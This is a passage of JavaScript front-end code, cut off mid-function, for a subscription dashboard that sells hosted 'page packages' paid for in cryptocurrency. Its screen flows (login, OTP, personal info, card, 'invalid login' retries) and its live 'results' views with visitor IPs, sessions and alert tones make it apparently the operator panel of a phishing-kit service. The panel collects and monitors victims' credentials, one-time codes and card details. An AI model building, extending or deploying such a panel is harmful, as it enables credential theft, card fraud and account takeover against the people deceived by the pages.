const templates = [
  {
    id: "blackbox-template",
    name: "Blackbox Launch",
    description: "Private access page for tools, drops, and closed communities.",
    status: "BLACKBOX SESSION ACTIVE"
  },
  {
    id: "command-template",
    name: "Command Layer",
    description: "Premium security operations dashboard and telemetry view.",
    status: "OVERWATCH FEEDS SYNCHRONIZED"
  },
  {
    id: "vault-template",
    name: "Vault Identity",
    description: "Technical portfolio card for high-signal builders.",
    status: "IDENTITY VAULT MASKED"
  }
];

const templateList = document.querySelector("#templateList");
const preview = document.querySelector("#preview");
const statusText = document.querySelector("#statusText");
const copyButton = document.querySelector("#copyButton");
const randomButton = document.querySelector("#randomButton");
const swatches = document.querySelector("#swatches");
const themeToggle = document.querySelector("#themeToggle");
const topbarTitle = document.querySelector("#topbarTitle");
const notificationCenter = document.querySelector("#notificationCenter");
const notificationToggle = document.querySelector("#notificationToggle");
const notificationBadge = document.querySelector("#notificationBadge");
const notificationPanel = document.querySelector("#notificationPanel");
const notificationList = document.querySelector("#notificationList");
const appShell = document.querySelector(".app-shell");
let activeTemplate = templates[0];

let marketPages = [];
let adminPackages = [];
const adminPackageLibraryState = { search: "", status: "all", source: "all", sort: "updated" };
const githubLiveStatusByPackage = new Map();

const packageDataModel = {
  identity: ["id", "slug", "name", "type", "status", "version"],
  billing: ["billingPeriods.daily", "billingPeriods.weekly", "billingPeriods.biweekly", "billingPeriods.monthly"],
  source: ["sourceType", "repo", "screens", "assets", "cssFiles", "inlineCssBlocks"],
  design: ["tokens.brand", "tokens.font", "tokens.radius", "cssMode", "design"],
  audit: ["createdAt", "updatedAt"]
};

const userPageConfigModel = {
  identity: ["id", "userId", "packageId", "packageVersion", "status"],
  subscription: ["billingPeriod", "renewalPrice", "renewalDate", "autoRenew", "walletSource"],
  routing: ["domain", "allowedDomains", "generatedFile.version", "generatedFile.lastGeneratedAt"],
  hosting: ["hostingConfig.domain", "hostingConfig.serverIp", "hostingConfig.hostingType", "hostingConfig.installPath", "hostingConfig.verified"],
  flow: ["flow", "configs", "screenOrder", "disabledScreens"],
  security: ["captcha", "bannedIps", "whitelistIps", "trafficLog"],
  results: ["results", "resultSettings.webhook", "resultSettings.retentionDays", "resultSettings.notifyOnResult"]
};

let adminUsers = [];
let adminInvitations = [];
let latestInvitationLink = null;
let signupInviteState = { token: "", status: "idle", email: "", expiresAt: "", error: "" };
let ownedPages = [];
let walletData = { balance: 0, currency: "USD", transactions: [] };
let walletDepositRequests = [];
let adminDepositRequests = [];
let walletFundOpen = false;
let walletHistoryOpen = false;
let walletFundingOptions = [];
let walletQuoteTimer = null;
let notificationItems = [];
let notificationUnreadCount = 0;
let notificationPollTimer = null;
let notificationInitialized = false;
const notificationSeenIds = new Set();
const expandedAdminUsers = new Set();
const collabAdminUsers = new Set();
const selectedMarketPlans = {};
const billingPeriodLabels = {
  daily: "Daily",
  weekly: "Weekly",
  biweekly: "Biweekly",
  monthly: "Monthly"
};
const cryptoFundingOptions = [
  { value: "USDT_TRC20", asset: "USDT", network: "TRC20", label: "USDT - TRC20" },
  { value: "USDT_ERC20", asset: "USDT", network: "ERC20", label: "USDT - ERC20" },
  { value: "BTC_BTC", asset: "BTC", network: "BTC", label: "Bitcoin - BTC" },
  { value: "ETH_ERC20", asset: "ETH", network: "ERC20", label: "Ethereum - ERC20" },
  { value: "BNB_BEP20", asset: "BNB", network: "BEP20", label: "BNB - BEP20" }
];
walletFundingOptions = cryptoFundingOptions.map((option) => ({ ...option, address: "", configured: false }));
const minimumWalletFundingUsd = 30;

const screenLibrary = [
  {
    name: "Login",
    type: "Credential screen",
    fields: ["Email or username", "Password"],
    status: "Enabled"
  },
  {
    name: "OTP",
    type: "Verification screen",
    fields: ["6-digit code", "Resend timer"],
    status: "Enabled"
  },
  {
    name: "Personal Info",
    type: "Data collection screen",
    fields: ["Full name", "Phone", "Address"],
    status: "Enabled"
  },
  {
    name: "Success",
    type: "Completion screen",
    fields: ["Success message", "Redirect URL"],
    status: "Enabled"
  },
  {
    name: "Redirect",
    type: "Final route",
    fields: ["Destination URL", "Delay seconds"],
    status: "Optional"
  }
];

let activeFlowSlug = null;
let draggedScreenName = null;
let apiLoadError = "";
const appearanceStorageKey = "deuceAppearance";
let appBusyTimer = null;
let initialBootActive = true;
const resultsAutoRefreshMs = 5000;
let resultsAutoRefreshTimer = null;
let resultsAutoRefreshSlug = "";
let resultsAutoRefreshBusy = false;
let resultsAutoRefreshPromise = null;
let resultsAutoRefreshUserPaused = false;
let resultsMutationBusy = false;
let resultNotificationAudioContext = null;
let activeResultViewer = null;

function setAppBusy(isBusy, label = "Working") {
  window.clearTimeout(appBusyTimer);
  const busy = Boolean(isBusy);
  const showCompactIndicator = busy && !initialBootActive;
  document.body.classList.toggle("app-busy", busy);
  appShell?.classList.toggle("is-loading", showCompactIndicator);
  appShell?.setAttribute("data-busy-label", label);
  if (busy && statusText) statusText.textContent = label.toUpperCase();
}

function clearAppBusySoon(delay = 220) {
  window.clearTimeout(appBusyTimer);
  appBusyTimer = window.setTimeout(() => setAppBusy(false), delay);
}

function pulseButton(button) {
  if (!button) return;
  button.classList.add("is-pressed");
  window.setTimeout(() => button.classList.remove("is-pressed"), 320);
}

function setButtonBusy(button, isBusy, label = "Working...") {
  if (!button) return;
  if (isBusy) {
    if (!button.dataset.originalHtml) button.dataset.originalHtml = button.innerHTML;
    button.classList.add("is-loading");
    button.setAttribute("aria-busy", "true");
    button.disabled = true;
    button.innerHTML = `<span class="button-roll" aria-hidden="true"></span><span>${escapeHtml(label)}</span>`;
    return;
  }
  button.classList.remove("is-loading");
  button.removeAttribute("aria-busy");
  button.disabled = false;
  if (button.dataset.originalHtml) {
    button.innerHTML = button.dataset.originalHtml;
    delete button.dataset.originalHtml;
  }
}

async function withButtonBusy(button, label, task) {
  setButtonBusy(button, true, label);
  try {
    return await task();
  } finally {
    setButtonBusy(button, false);
    clearAppBusySoon();
  }
}

function getAppearancePreference() {
  try {
    return JSON.parse(localStorage.getItem(appearanceStorageKey)) || {};
  } catch {
    return {};
  }
}

function saveAppearancePreference(nextPreference) {
  const current = getAppearancePreference();
  localStorage.setItem(appearanceStorageKey, JSON.stringify({ ...current, ...nextPreference }));
}

function setThemeMode(theme, persist = false) {
  const nextTheme = theme === "light" ? "light" : "dark";
  const isLight = nextTheme === "light";
  document.documentElement.dataset.theme = nextTheme;
  themeToggle?.setAttribute("aria-label", isLight ? "Switch to dark theme" : "Switch to light theme");
  if (themeToggle) {
    themeToggle.innerHTML = isLight
      ? '<span aria-hidden="true">&#9728;</span><strong>Light Mode</strong>'
      : '<span aria-hidden="true">&#127769;</span><strong>Dark Mode</strong>';
  }
  if (persist) saveAppearancePreference({ theme: nextTheme });
}

const accentPalette = new Map([
  ["#7cffb2", { key: "phosphor", hex: "#7CFFB2" }],
  ["#6debff", { key: "ice", hex: "#6DEBFF" }],
  ["#ff4d8d", { key: "magenta", hex: "#FF4D8D" }],
  ["#f9d56e", { key: "amber", hex: "#F9D56E" }]
]);

function setAccentColor(accent, persist = false) {
  const requested = String(accent || "").trim().toLowerCase();
  const selection = accentPalette.get(requested) || accentPalette.get("#7cffb2");
  document.documentElement.dataset.accent = selection.key;
  document.querySelectorAll(".swatch").forEach((item) => {
    item.classList.toggle("active", item.dataset.accent?.toLowerCase() === selection.hex.toLowerCase());
  });
  if (persist) saveAppearancePreference({ accent: selection.hex });
}

function applyAppearancePreference() {
  const preference = getAppearancePreference();
  setThemeMode(preference.theme || document.documentElement.dataset.theme || "dark");
  setAccentColor(preference.accent || "#7CFFB2");
}

async function saveFlowState(page) {
  try {
    const result = await requestApi(`/api/user-pages/${page.id}/config`, {
      method: "PATCH",
      body: JSON.stringify({
        domain: page.domain,
        flow: page.flow,
        configs: page.configs || {},
        securityConfig: page.securityConfig || {},
        subscription: page.subscription || {},
        generatedFile: page.generatedFile || {},
        resultSettings: page.resultSettings || {},
        hostingConfig: page.hostingConfig || {}
      })
    });
    return result?.userPage || page;
  } catch (error) {
    statusText.textContent = `SAVE FAILED: ${error.message}`.toUpperCase();
    return null;
  }
}

function getPageBySlug(pageSlug) {
  const key = String(pageSlug || "");
  return ownedPages.find((item) => (
    String(item.id || "") === key
    || String(item.slug || "") === key
    || String(item.packageId || "") === key
    || String(item.routeKey || "") === key
  )) || null;
}

function pageRouteKey(page = {}) {
  return page.id || page.routeKey || page.slug || page.packageId || "";
}

function normalizeAllowedHost(value = "") {
  return String(value || "").trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/:\d+$/, "");
}

function isResultsRoute(pageSlug = "") {
  const hash = window.location.hash || "";
  return hash.startsWith("#results-") && (!pageSlug || hash.replace("#results-", "") === pageSlug);
}

function resultsAutoRefreshBlockReason() {
  if (document.visibilityState === "hidden") return "hidden";
  if (resultsMutationBusy) return "mutation";
  if (activeResultViewer) return "viewer";
  const center = preview.querySelector(".compact-results-center");
  if (!center) return "";
  if (center.querySelector("[data-result-select]:checked")) return "selection";
  if (center.querySelector("[data-compact-session][open]")) return "session";
  const activeElement = document.activeElement;
  if (activeElement && center.contains(activeElement) && activeElement.matches("input, select, textarea")) return "interaction";
  return "";
}

function updateResultsAutoRefreshStatus(reason = resultsAutoRefreshBlockReason()) {
  const indicator = preview.querySelector("[data-results-live-status]");
  const toggle = preview.querySelector("[data-toggle-results-auto-refresh]");
  const interactionPaused = Boolean(reason && reason !== "hidden");
  if (indicator) {
    indicator.textContent = resultsAutoRefreshUserPaused
      ? "Live updates paused"
      : interactionPaused
        ? "Paused while you work"
        : resultsAutoRefreshBusy
          ? "Updating results"
          : "Live updates on";
    indicator.classList.toggle("is-paused", resultsAutoRefreshUserPaused || interactionPaused);
  }
  if (toggle) {
    toggle.textContent = resultsAutoRefreshUserPaused ? "Resume live" : "Pause live";
    toggle.setAttribute("aria-pressed", resultsAutoRefreshUserPaused ? "true" : "false");
  }
}

function stopResultsAutoRefresh({ resetUserPause = true } = {}) {
  if (resultsAutoRefreshTimer) {
    window.clearInterval(resultsAutoRefreshTimer);
  }
  resultsAutoRefreshTimer = null;
  resultsAutoRefreshSlug = "";
  resultsAutoRefreshBusy = false;
  resultsAutoRefreshPromise = null;
  resultsMutationBusy = false;
  if (resetUserPause) resultsAutoRefreshUserPaused = false;
}

async function runResultsMutation(work) {
  resultsMutationBusy = true;
  updateResultsAutoRefreshStatus("mutation");
  const pendingRefresh = resultsAutoRefreshPromise;
  if (pendingRefresh) {
    try {
      await pendingRefresh;
    } catch {
      // The foreground action will load authoritative data after the mutation.
    }
  }
  try {
    return await work();
  } finally {
    resultsMutationBusy = false;
    updateResultsAutoRefreshStatus();
  }
}

function startResultsAutoRefresh(pageSlug) {
  if (!pageSlug || !isResultsRoute(pageSlug)) return;
  if (resultsAutoRefreshTimer && resultsAutoRefreshSlug === pageSlug) return;
  stopResultsAutoRefresh({ resetUserPause: false });
  resultsAutoRefreshSlug = pageSlug;
  resultsAutoRefreshTimer = window.setInterval(async () => {
    if (resultsAutoRefreshBusy) return;
    if (!isResultsRoute(pageSlug)) {
      stopResultsAutoRefresh();
      return;
    }
    if (resultsAutoRefreshUserPaused) {
      updateResultsAutoRefreshStatus("manual");
      return;
    }
    const blockReason = resultsAutoRefreshBlockReason();
    if (blockReason) {
      updateResultsAutoRefreshStatus(blockReason);
      return;
    }
    resultsAutoRefreshBusy = true;
    updateResultsAutoRefreshStatus("");
    const refreshPromise = renderResultsCenter(pageSlug, { autoRefresh: true });
    resultsAutoRefreshPromise = refreshPromise;
    try {
      await refreshPromise;
    } finally {
      if (resultsAutoRefreshPromise === refreshPromise) resultsAutoRefreshPromise = null;
      resultsAutoRefreshBusy = false;
      updateResultsAutoRefreshStatus();
    }
  }, resultsAutoRefreshMs);
}

function playNewResultTone() {
  const AudioContextType = window.AudioContext || window.webkitAudioContext;
  if (!AudioContextType) return;
  try {
    resultNotificationAudioContext = resultNotificationAudioContext || new AudioContextType();
    const context = resultNotificationAudioContext;
    if (context.state === "suspended") context.resume().catch(() => {});
    const oscillator = context.createOscillator();
    const gain = context.createGain();
    const now = context.currentTime;
    oscillator.type = "sine";
    oscillator.frequency.setValueAtTime(720, now);
    oscillator.frequency.exponentialRampToValueAtTime(540, now + 0.18);
    gain.gain.setValueAtTime(0.0001, now);
    gain.gain.exponentialRampToValueAtTime(0.08, now + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.24);
    oscillator.connect(gain);
    gain.connect(context.destination);
    oscillator.start(now);
    oscillator.stop(now + 0.26);
  } catch (error) {
    console.debug("Result notification tone skipped", error);
  }
}

function notificationPageKey(notification = {}) {
  return String(
    notification.userPageId
    || notification.metadata?.userPageId
    || notification.metadata?.pageId
    || notification.metadata?.pageSlug
    || ""
  );
}

function notificationTimeLabel(value) {
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return "Just now";
  return date.toLocaleString([], { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
}

function renderNotificationCenter() {
  if (!notificationCenter || !notificationBadge || !notificationList) return;
  notificationCenter.hidden = !isLoggedIn();
  notificationBadge.hidden = notificationUnreadCount < 1;
  notificationBadge.textContent = notificationUnreadCount > 99 ? "99+" : String(notificationUnreadCount);
  notificationToggle?.setAttribute("aria-label", `Open notifications${notificationUnreadCount ? `, ${notificationUnreadCount} unread` : ""}`);
  notificationList.innerHTML = notificationItems.length
    ? notificationItems.map((notification) => `
        <button type="button" class="notification-item ${notification.readAt ? "" : "is-unread"}" data-notification-open="${escapeHtml(notification.id)}" data-notification-page="${escapeHtml(notificationPageKey(notification))}">
          <strong>${escapeHtml(notification.title || "New result")}</strong>
          <span>${escapeHtml(notification.message || "A new result was submitted.")}</span>
          <small>${escapeHtml(notificationTimeLabel(notification.createdAt))}</small>
        </button>
      `).join("")
    : "<p>No notifications yet.</p>";
}

async function refreshNotifications({ silent = false } = {}) {
  if (!isLoggedIn()) return;
  try {
    const result = await requestApi("/api/notifications?limit=40");
    const incoming = result.notifications || [];
    if (notificationInitialized && !silent) {
      const hasNewUnread = incoming.some((notification) => !notification.readAt && !notificationSeenIds.has(notification.id));
      if (hasNewUnread) playNewResultTone();
    }
    incoming.forEach((notification) => notificationSeenIds.add(notification.id));
    notificationItems = incoming;
    notificationUnreadCount = Number(result.unreadCount || 0);
    notificationInitialized = true;
    renderNotificationCenter();
  } catch (error) {
    console.debug("Notification refresh skipped", error);
  }
}

function startNotificationPolling() {
  if (notificationPollTimer) window.clearInterval(notificationPollTimer);
  notificationPollTimer = null;
  if (!isLoggedIn()) return;
  notificationPollTimer = window.setInterval(() => refreshNotifications(), 10000);
}

function resetNotifications() {
  if (notificationPollTimer) window.clearInterval(notificationPollTimer);
  notificationPollTimer = null;
  notificationItems = [];
  notificationUnreadCount = 0;
  notificationInitialized = false;
  notificationSeenIds.clear();
  if (notificationPanel) notificationPanel.hidden = true;
  if (notificationToggle) notificationToggle.setAttribute("aria-expanded", "false");
  renderNotificationCenter();
}

function renderMissingPage() {
  activeFlowSlug = null;
  stopResultsAutoRefresh();
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>record not found</small>
        <h2>Page is not available</h2>
        <p>This page must come from a real subscription record before it can be configured.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "My Pages", "primary"),
        routeButton("#pages", "Browse pages"),
        ...(isAdmin() ? [routeButton("#admin", "Admin")] : [])
      ])}
      ${emptyState("No page record loaded", "Connect the API/database or subscribe to a page package first.", "#pages")}
    </section>
  `;
  statusText.textContent = "PAGE RECORD REQUIRED";
  topbarTitle.textContent = "Page Required";
}

function getScreenConfig(page, screenName) {
  return {
    title: `${screenName} Page`,
    buttonText: screenName === "Success" || screenName === "Redirect" ? "Continue" : "Next",
    redirectUrl: "",
    fields: screenLibrary.find((screen) => screen.name === screenName)?.fields.join(", ") || "",
    ...(page.configs?.[screenName] || {})
  };
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function routeButton(hash, label, variant = "") {
  return `<button type="button" class="${variant}" data-route="${hash}">${label}</button>`;
}

function viewNav(buttons) {
  return `<nav class="view-nav" aria-label="Page navigation">${buttons.join("")}</nav>`;
}

function apiBase() {
  const isFile = window.location.protocol === "file:";
  return isFile ? "http://localhost:10000" : window.location.origin;
}

async function requestApi(path, options = {}) {
  let response;
  try {
    response = await fetch(`${apiBase()}${path}`, {
      credentials: "same-origin",
      ...options,
      headers: { "Content-Type": "application/json", ...(options.headers || {}) }
    });
  } catch (error) {
    const apiError = new Error(`API connection failed at ${apiBase()}${path}`);
    apiError.status = 0;
    apiError.cause = error;
    throw apiError;
  }
  const data = await response.json().catch(() => ({}));
  if (!response.ok) {
    const issueDetail = Array.isArray(data.issues) && data.issues.length ? `: ${data.issues.join("; ")}` : "";
    const error = new Error(`${data.error || `API request failed: ${response.status}`}${issueDetail}`);
    error.status = response.status;
    error.data = data;
    throw error;
  }
  return data;
}

async function checkAdminApiConnection() {
  let health;
  try {
    health = await requestApi("/api/health");
  } catch (error) {
    return {
      ok: false,
      status: error.status || 0,
      title: "API connection failed",
      detail: `The app could not reach ${apiBase()}/api/health. Check Render deploy status, API_BASE_URL/CORS_ORIGINS, and that the web service is awake.`
    };
  }

  try {
    const session = await requestApi("/api/auth/me");
    if (String(session.user?.role || "").toLowerCase() !== "admin") {
      return {
        ok: false,
        status: 403,
        title: "Admin access required",
        detail: "GitHub import is an admin action. Log in with an email listed in ADMIN_EMAILS on Render, then refresh and try again."
      };
    }
    return { ok: true, health, user: session.user };
  } catch (error) {
    return {
      ok: false,
      status: error.status || 0,
      title: error.status === 401 ? "Login required" : "Admin session check failed",
      detail: error.status === 401
        ? "Log in first, then open Admin > Import > GitHub again."
        : error.message
    };
  }
}

function formatMoney(value) {
  return `$${Number(value || 0).toFixed(2).replace(/\.00$/, "")}`;
}

function billingPrice(pagePackage, period) {
  const billing = pagePackage.billingPeriods || {};
  return Number(billing[period] ?? billing.weekly ?? 25);
}

function billingLabel(period) {
  return billingPeriodLabels[period] || period;
}

function selectedBillingPeriod(pagePackage) {
  return selectedMarketPlans[pagePackage.slug] || "weekly";
}

function billingOptionLabel(pagePackage, period) {
  return `${billingLabel(period)} - ${formatMoney(billingPrice(pagePackage, period))}`;
}

function marketPriceLabel(pagePackage, period) {
  return isAdmin() ? `${billingLabel(period)} - Admin free` : billingOptionLabel(pagePackage, period);
}

function marketSubscribeLabel(pagePackage, period) {
  return isAdmin() ? "Activate free" : `Subscribe - ${formatMoney(billingPrice(pagePackage, period))}`;
}

function subscriptionState(page) {
  const subscription = page.subscription || {};
  if (subscription.adminFreeSubscription) {
    return {
      label: "Admin free",
      className: "is-free",
      dueLabel: "No renewal charge",
      canRenew: false
    };
  }

  const renewalDate = subscription.renewalDate || "";
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const renewal = renewalDate ? new Date(`${renewalDate}T00:00:00`) : null;
  const daysLeft = renewal && !Number.isNaN(renewal.getTime())
    ? Math.ceil((renewal.getTime() - today.getTime()) / 86400000)
    : null;
  const expired = daysLeft !== null && daysLeft < 0;
  const dueSoon = daysLeft !== null && daysLeft <= 3 && daysLeft >= 0;
  const paymentFailed = page.status === "payment_failed" || subscription.renewalStatus === "payment_failed";
  const locked = paymentFailed || page.status === "expired" || subscription.renewalStatus === "expired" || expired;

  return {
    label: paymentFailed ? "Payment failed" : locked ? "Expired" : dueSoon ? "Due soon" : subscription.autoRenew ? "Auto renew" : "Manual renew",
    className: paymentFailed ? "is-failed" : locked ? "is-expired" : dueSoon ? "is-due" : subscription.autoRenew ? "is-auto" : "is-manual",
    dueLabel: renewalDate || "Not scheduled",
    canRenew: true,
    expired: locked,
    dueSoon,
    paymentFailed,
    daysLeft
  };
}

const operationalPageCapabilities = new Set([
  "goLive",
  "editConfig",
  "editSecurity",
  "generateIndex",
  "verifyHosting",
  "installWorker",
  "syncScreens",
  "controlSessions"
]);

function pageCapabilityAllowed(page, capability) {
  const serverValue = page?.capabilities?.[capability];
  if (typeof serverValue === "boolean") return serverValue;
  if (operationalPageCapabilities.has(capability)) return !subscriptionState(page).expired;
  return true;
}

function disabledPageCapabilityAttributes(page, capability) {
  return pageCapabilityAllowed(page, capability) ? "" : ' disabled aria-disabled="true"';
}

function guardPageCapability(pageSlug, capability) {
  const page = getPageBySlug(pageSlug);
  if (!page || pageCapabilityAllowed(page, capability)) return true;
  window.location.hash = "#my-pages";
  statusText.textContent = page.name.toUpperCase() + " SUBSCRIPTION EXPIRED";
  return false;
}

function findPackageThumbnail(pagePackage) {
  if (pagePackage.packageManifest?.thumbnailPath) return pagePackage.packageManifest.thumbnailPath;
  const files = [
    ...(pagePackage.packageManifest?.files || []).map((file) => file.path || file),
    ...(pagePackage.assets || [])
  ].filter(Boolean);
  const preferred = [
    /(^|\/)favicon\.(ico|png|svg|webp)$/i,
    /(^|\/)apple-touch-icon\.(png|webp)$/i,
    /(^|\/)(site-)?logo\.(png|jpe?g|svg|webp)$/i,
    /(^|\/).*icon.*\.(png|svg|webp|ico)$/i,
    /(^|\/).*logo.*\.(png|jpe?g|svg|webp)$/i
  ];
  for (const pattern of preferred) {
    const match = files.find((file) => pattern.test(String(file)));
    if (match) return String(match);
  }
  return "";
}

function normalizePackage(pagePackage) {
  const billing = pagePackage.billingPeriods || {};
  const weekly = Number(billing.weekly ?? 25);
  const manifestScreens = pagePackage.packageManifest?.screens || [];
  const entryScreenId = pagePackage.packageManifest?.entryScreenId || "";
  const previewFile = manifestScreens.find((screen) => screen.id === entryScreenId && screen.enabled !== false)?.file
    || manifestScreens.find((screen) => screen.role === "entry" && screen.enabled !== false)?.file
    || manifestScreens.find((screen) => screen.enabled !== false)?.file
    || manifestScreens[0]?.file
    || "";
  const cleanDescription = pagePackage.packageManifest?.description || "Ready to preview and subscribe.";
  return {
    ...pagePackage,
    billingPeriods: {
      daily: Number(billing.daily ?? Math.ceil(weekly / 5)),
      weekly,
      biweekly: Number(billing.biweekly ?? weekly * 2),
      monthly: Number(billing.monthly ?? weekly * 4)
    },
    type: pagePackage.packageManifest?.type || pagePackage.sourceType || "Page package",
    weeklyPrice: `${formatMoney(weekly)}/week`,
    prices: [
      `Daily ${formatMoney(billing.daily ?? Math.ceil(weekly / 5))}`,
      `Weekly ${formatMoney(weekly)}`,
      `Biweekly ${formatMoney(billing.biweekly ?? weekly * 2)}`,
      `Monthly ${formatMoney(billing.monthly ?? weekly * 4)}`
    ],
    description: cleanDescription,
    userSummary: cleanDescription,
    stats: [],
    source: pagePackage.sourceType === "github" ? "GitHub repo" : "Uploaded bundle",
    repo: pagePackage.repoUrl || "",
    cssMode: "",
    design: pagePackage.status || "Draft",
    price: `${formatMoney(weekly)}/week`,
    tokens: pagePackage.designTokens || {},
    inlineCssBlocks: pagePackage.packageManifest?.inlineCssBlocks || 0,
    previewFile,
    thumbnailDataUrl: pagePackage.packageManifest?.thumbnailDataUrl || "",
    thumbnailPath: findPackageThumbnail(pagePackage),
    previewReady: Boolean(pagePackage.previewAvailable && previewFile)
  };
}

function normalizeUserPage(page) {
  const results = page.results || [];
  const routeKey = page.id || page.routeKey || page.slug || page.packageId || "";
  return {
    ...page,
    routeKey,
    slug: page.slug || routeKey,
    status: page.status || "active",
    traffic: page.traffic || "0 views",
    security: page.securityConfig?.captcha ? "Captcha on" : "Security ready",
    flow: page.flow || [],
    configs: page.configs || {},
    results,
    subscription: page.subscription || {},
    generatedFile: page.generatedFile || {},
    resultSettings: page.resultSettings || {},
    hostingConfig: page.hostingConfig || {},
    securityConfig: page.securityConfig || { domains: [], captcha: false, turnstile: { siteKey: "", secretKey: "" }, bannedIps: [], whitelistIps: [], blockedDevices: [], trafficLog: [] }
  };
}

function normalizeAdminUser(user) {
  const pages = (user.pages || []).map(normalizeUserPage);
  const spend = user.spend || {};
  return {
    ...user,
    name: user.name || user.email || "User",
    role: user.role || "subscriber",
    status: user.status || "active",
    walletBalance: Number(user.walletBalance ?? user.wallet ?? 0),
    collaboration: user.collaboration || {},
    spend: {
      totalSpent: Number(spend.totalSpent || 0),
      subscriptionSpend: Number(spend.subscriptionSpend || 0),
      totalFunded: Number(spend.totalFunded || 0),
      cryptoFunded: Number(spend.cryptoFunded || 0),
      adminCredits: Number(spend.adminCredits || 0),
      adminDebits: Number(spend.adminDebits || 0)
    },
    recentTransactions: user.recentTransactions || [],
    pages,
    pageCount: pages.length
  };
}

function adminUserById(userId) {
  return adminUsers.find((user) => user.id === userId) || null;
}

function syncAdminPageToggleFields(select) {
  const userId = select.dataset.adminPageSelect;
  const user = adminUserById(userId);
  const page = user?.pages?.find((item) => item.id === select.value);
  const freeToggle = preview.querySelector(`[data-admin-page-free="${userId}"]`);
  const autoRenewToggle = preview.querySelector(`[data-admin-page-autorenew="${userId}"]`);
  if (freeToggle) freeToggle.checked = Boolean(page?.subscription?.adminFreeSubscription);
  if (autoRenewToggle) autoRenewToggle.checked = Boolean(page?.subscription?.autoRenew);
}

function normalizePageResult(result) {
  const createdAt = result.createdAt || result.date || new Date().toISOString();
  const date = new Date(createdAt);
  const payload = result.payload || result.fields || {};
  const screen = result.screen || result.pageId || "Page";
  return {
    ...result,
    status: String(result.status || "new").toLowerCase(),
    screen,
    fields: resultDisplayFields(payload, screen),
    ip: result.ip || "unknown",
    date: Number.isNaN(date.getTime()) ? "--" : date.toLocaleDateString(),
    time: Number.isNaN(date.getTime()) ? "--" : date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
  };
}

function isInternalResultField(label) {
  const value = String(label || "");
  return value.startsWith("_") || ["redaction", "fieldCount", "field_count"].includes(value);
}

function redactedDisplayValue(value) {
  if (value === null || value === undefined || value === "" || value === "[blank]") return "[blank]";
  return "[redacted]";
}

function isOtpResultContext(screen = "", fields = {}) {
  const screenText = normalizeFlowLabel(screen);
  if (screenText.includes("otp") || screenText.includes("verification")) return true;
  return Object.keys(fields).some((label) => {
    const text = normalizeFlowLabel(label);
    return text.includes("otp") || text.includes("verification code") || text === "code";
  });
}

function isOtpDigitField(label = "") {
  const text = normalizeFlowLabel(label);
  if (text.includes("otp") || text.includes("verification code")) return true;
  if (/\b(first|second|third|fourth|fifth|sixth|digit|code)\b/i.test(text)) return true;
  if (/\b\d(?:st|nd|rd|th)?\s*(digit|code)\b/i.test(text)) return true;
  return false;
}

function normalizeOtpResultFields(fields = {}, screen = "") {
  const entries = Object.entries(fields).filter(([label]) => !isInternalResultField(label));
  if (!entries.length || !isOtpResultContext(screen, fields)) return fields;

  const otpEntries = entries.filter(([label]) => isOtpDigitField(label));
  if (entries.length === 1 || otpEntries.length >= 2 || otpEntries.length === entries.length) {
    const hasBlank = entries.some(([, value]) => value === "[blank]" || value === "");
    return { Otp: hasBlank && entries.length === 1 ? "[blank]" : "[redacted]" };
  }

  return fields;
}

function resultDisplayFields(payload = {}, screen = "") {
  if (!payload || typeof payload !== "object" || Array.isArray(payload)) return {};
  const normalizedScreen = normalizeFlowLabel(screen);
  const screenKey = Object.keys(payload).find((key) => (
    key && typeof payload[key] === "object" && !Array.isArray(payload[key])
    && normalizeFlowLabel(key) === normalizedScreen
  ));
  const source = screenKey ? payload[screenKey] : payload;
  const fields = Object.entries(source || {}).reduce((nextFields, [label, value]) => {
    if (isInternalResultField(label)) return nextFields;
    if (value && typeof value === "object" && !Array.isArray(value)) {
      Object.entries(resultDisplayFields(value, label)).forEach(([nestedLabel, nestedValue]) => {
        nextFields[nestedLabel] = nestedValue;
      });
      return nextFields;
    }
    nextFields[label] = redactedDisplayValue(value);
    return nextFields;
  }, {});
  return normalizeOtpResultFields(fields, screen);
}

function splitRuleList(value = "") {
  return String(value || "")
    .split(/\n|,/)
    .map((item) => item.trim())
    .filter(Boolean)
    .filter((item, index, list) => list.indexOf(item) === index);
}

function reconcileIpRules(bannedIps = [], whitelistIps = []) {
  const whitelistSet = new Set(whitelistIps);
  return {
    bannedIps: bannedIps.filter((ip) => !whitelistSet.has(ip)),
    whitelistIps
  };
}

function applyPageSecurityConfig(page, securityConfig = {}) {
  page.securityConfig = { ...(page.securityConfig || {}), ...securityConfig };
  ownedPages = ownedPages.map((item) => item.id === page.id ? { ...item, securityConfig: page.securityConfig } : item);
  return page.securityConfig;
}

function resultTimestampValue(result = {}) {
  const value = new Date(result.createdAt || result.date || 0).getTime();
  return Number.isFinite(value) ? value : 0;
}

function resultSessions(results = []) {
  const sessions = new Map();
  results.forEach((result) => {
    const sessionId = result.sessionId || "no-session";
    const current = sessions.get(sessionId) || {
      sessionId,
      results: [],
      firstSeen: result.createdAt,
      lastSeen: result.createdAt,
      ip: result.ip || "unknown"
    };
    current.results.push(result);
    if (resultTimestampValue(result) < resultTimestampValue({ createdAt: current.firstSeen })) current.firstSeen = result.createdAt;
    if (resultTimestampValue(result) > resultTimestampValue({ createdAt: current.lastSeen })) {
      current.lastSeen = result.createdAt;
      current.ip = result.ip || current.ip;
    }
    sessions.set(sessionId, current);
  });
  return [...sessions.values()]
    .map((session) => ({
      ...session,
      results: session.results.sort((a, b) => resultTimestampValue(a) - resultTimestampValue(b))
    }))
    .sort((a, b) => resultTimestampValue({ createdAt: b.lastSeen }) - resultTimestampValue({ createdAt: a.lastSeen }));
}

const resultStepDefinitions = [
  ["login", "Login submitted"],
  ["login2", "Invalid login submitted"],
  ["otp", "OTP submitted"],
  ["otp2", "Invalid OTP submitted"],
  ["email", "Email submitted"],
  ["personal", "Personal info submitted"],
  ["card", "Card submitted"],
  ["upload", "Upload submitted"],
  ["thanks", "Thank you submitted"],
  ["other", "Other submitted"]
];

function resultStepKey(result = {}) {
